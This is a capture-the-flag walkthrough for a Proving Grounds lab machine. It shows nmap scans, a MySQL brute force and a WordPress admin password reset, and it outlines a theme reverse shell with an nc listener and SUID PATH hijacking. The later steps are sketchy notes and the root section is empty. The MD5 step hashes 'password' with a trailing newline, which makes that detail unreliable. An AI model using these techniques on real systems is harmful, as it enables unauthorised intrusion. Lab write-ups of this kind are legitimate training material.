# SunsetMidnight

This is a walkthrough for SunsetMidnight, an intermediate rated box on Offensive Security's "Proving Grounds".

https://www.offensive-security.com/

The basic pathway we will follow is:

1. Scan to enumerate open services.
2. Brute force of credentials to MySQL server
3. Modify admin user password in Wordpress database to gain access the the Wordpress Control Panel
4. Insert a reverse shell code into a Wordpress theme to gain a shell foothold.
5. Move laterally to a another user with credentials gathered from wp-config
6. Priv esc to root using path hijacking and an SUID binary.

### Tools

- Kali Linux
- Nmap
- mysql
- WPScan

### Notes

- Important! Before attempting this machine make sure you add the host "sunset-midnight" to your /etc/hosts file, otherwise it may not work as expected.

### Target

- The target IP for this walkthrough was:
  IP: 192.168.94.88

# Attack

## Port Scan

- We begin with a basic nmap scan to enumerate the open TCP ports.  I like to use the following as my default scan:

	  sudo nmap -sV -sC -p- 192.168.94.88 -oN nmapscan

- Our scan shows open ports for **SSH**, **Apache web server**, and **MySQL**:

	  Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-05 18:23 EDT
	  Nmap scan report for 192.168.94.88
	  Host is up (0.035s latency).
	  Not shown: 65532 closed tcp ports (reset)
	  PORT     STATE SERVICE VERSION
	  22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
	  | ssh-hostkey: 
	  |   2048 9c:fe:0b:8b:8d:15:e7:72:7e:3c:23:e5:86:55:51:2d (RSA)
	  |   256 fe:eb:ef:5d:40:e7:06:67:9b:63:67:f8:d9:7e:d3:e2 (ECDSA)
	  |_  256 35:83:68:2c:33:8b:b4:6c:24:21:20:0d:52:ed:cd:16 (ED25519)
	  80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
	  |_http-server-header: Apache/2.4.38 (Debian)
	  |_http-title: Did not follow redirect to http://sunset-midnight/
	  | http-robots.txt: 1 disallowed entry 
	  |_/wp-admin/
	  3306/tcp open  mysql   MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1
	  | mysql-info: 
	  |   Protocol: 10
	  |   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1
	  |   Thread ID: 16
	  |   Capabilities flags: 63486
	  |   Some Capabilities: IgnoreSigpipes, Support41Auth, Speaks41ProtocolOld, FoundRows, DontAllowDatabaseTableColumn, SupportsTransactions, InteractiveClient, LongColumnFlag, SupportsCompression, ConnectWithDatabase, ODBCClient, SupportsLoadDataLocal, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
	  |   Status: Autocommit
	  |   Salt: h_%:2./B;C!uM^tJWU&[
	  |_  Auth Plugin Name: mysql_native_password
	  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

	  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	  Nmap done: 1 IP address (1 host up) scanned in 67.85 seconds

- ### MySQL server

  - Using builtin nmap scripts we can further enumerate the MySQL service:

		nmap -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 -p 3306 192.168.94.88

	The scan results show us a list of valid MySQL users:

		Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-12 16:46 EDT
		Nmap scan report for sunset-midnight (192.168.94.88)
		Host is up (0.090s latency).

		PORT     STATE SERVICE
		3306/tcp open  mysql
		| mysql-info: 
		|   Protocol: 10
		|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1
		|   Thread ID: 2118
		|   Capabilities flags: 63486
		|   Some Capabilities: SupportsTransactions, Speaks41ProtocolNew, LongColumnFlag, Support41Auth, ConnectWithDatabase, SupportsLoadDataLocal, IgnoreSigpipes, FoundRows, DontAllowDatabaseTableColumn, ODBCClient, Speaks41ProtocolOld, InteractiveClient, SupportsCompression, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
		|   Status: Autocommit
		|   Salt: J0R/1GSIUMe4pZRkCN?0
		|_  Auth Plugin Name: mysql_native_password
		| mysql-enum: 
		|   Valid usernames: 
		|     root:<empty> - Valid credentials
		|     netadmin:<empty> - Valid credentials
		|     guest:<empty> - Valid credentials
		|     web:<empty> - Valid credentials
		|     user:<empty> - Valid credentials
		|     sysadmin:<empty> - Valid credentials
		|     administrator:<empty> - Valid credentials
		|     webadmin:<empty> - Valid credentials
		|     admin:<empty> - Valid credentials
		|     test:<empty> - Valid credentials
		|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0

		Nmap done: 1 IP address (1 host up) scanned in 472.02 seconds

## Brute force credentials of MySQL server

  - We could put this list of users into a text file and conduct an brute force attack however is this case we can simply use antoher buitin nmap script for MySQL brute force.
	
		nmap --script=mysql-brute -p 3306 192.168.94.88
		
	We see that the script finds a password for the root user
	
		Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-12 16:58 EDT
		Nmap scan report for sunset-midnight (192.168.94.88)
		Host is up (0.83s latency).

		PORT     STATE SERVICE
		3306/tcp open  mysql
		| mysql-brute: 
		|   Accounts: 
		|     root:robert - Valid credentials
		|_  Statistics: Performed 31749 guesses in 600 seconds, average tps: 50.1

		Nmap done: 1 IP address (1 host up) scanned in 600.67 seconds:
		
	User: root
	Pass: robert
	
## Modify admin user password in Wordpress database to gain access the the Wordpress Control Panel

- With our credentials we can now log into the SQL server:

	  mysql --host=192.168.94.88 -u root -p
	  
- Once connected we can list the available databases:

	  MariaDB [(none)]> SHOW DATABASES;
	  +--------------------+
	  | Database           |
	  +--------------------+
	  | information_schema |
	  | mysql              |
	  | performance_schema |
	  | wordpress_db       |
	  +--------------------+
	  4 rows in set (0.168 sec)

  Accessing the server in the webrowser confirms that the server is hosting Wordpress page.
  
- We can access wordpress_db with the following command:

	  MariaDB [(none)]> connect wordpress_db
	  Reading table information for completion of table and column names
	  You can turn off this feature to get a quicker startup with -A

	  Connection id:    48248
	  Current database: wordpress_db
	
- Now that we have access to the database we want to change to admin password so that we can log into the admin portal.  First let us identify the user we want to change:

	  MariaDB [wordpress_db]> SHOW TABLES;
	  +------------------------+
	  | Tables_in_wordpress_db |
	  +------------------------+
	  | wp_commentmeta         |
	  | wp_comments            |
	  | wp_links               |
	  | wp_options             |
	  | wp_postmeta            |
	  | wp_posts               |
	  | wp_sp_polls            |
	  | wp_term_relationships  |
	  | wp_term_taxonomy       |
	  | wp_termmeta            |
	  | wp_terms               |
	  | wp_usermeta            |
	  | wp_users               |
	  +------------------------+
	  13 rows in set (0.092 sec)

	  
	  MariaDB [wordpress_db]> SELECT * FROM wp_users;
	  +----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
	  | ID | user_login | user_pass                          | user_nicename | user_email          | user_url               | user_registered     | user_activation_key | user_status | display_name |
	  +----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
	  |  1 | admin      | $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/ | admin         | example@example.com | http://sunset-midnight | 2020-07-16 19:10:47 |                     |           0 | admin       |
	  +----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
	  1 row in set (0.101 sec)
	  
- We want to change the admin user password.  First we need to generate a new password.  The password in the table is a Wordpress formatted hash but Wordpress will accept MD5 hashes as well.  We can generate an MD5 hash of 'password' from the command line:

	  echo password | md5sum
	  
  We get the following hash:
  
	  286755fad04869ca523320acce0dc6a4
	
# Exploit

PHP-reverse-shell
  - inside theme header.php
	  - insert in header of inactive theme
	  - start nc listener
		  - nc -nlvp 4444
	  - switch theme
	   
# Priv-esc

- as www-data user
	- check wp-config for user name/pw
	  - user: jose
	  - pass: 
	  - su to jose

- check suid binaries
  - /usr/bin/status
    - not listed in GTFObins but strings shows relative reference to 'service'
    - modify PATH to  run fake 'service' file
      - script to open new shell
    - run 'status'

# Root

	
	
	
	

  
 
 
